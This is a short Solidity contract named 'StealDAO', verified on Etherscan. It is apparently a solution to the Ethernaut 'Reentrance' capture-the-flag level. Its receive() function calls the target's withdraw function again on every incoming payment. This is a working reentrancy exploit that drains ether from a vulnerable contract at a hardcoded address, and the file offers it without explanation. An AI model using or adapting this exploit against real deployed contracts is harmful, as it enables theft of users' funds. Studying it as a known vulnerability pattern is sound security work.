/**
 *Submitted for verification at Etherscan.io on 2022-05-21
*/

pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract StealDAO {
    address levelInstance;

    constructor() {
        levelInstance = 0xfA39bC76B03C6d7FaC468B46DdB8239631b7a640;
    }

    function donate(address _to) public payable {
        IReentrance(levelInstance).donate{value: msg.value}(_to);
    }

    function withdraw(uint amount) public {
        IReentrance(levelInstance).withdraw(amount);
    }

    receive() external payable {
        IReentrance(levelInstance).withdraw(msg.value);
    }
}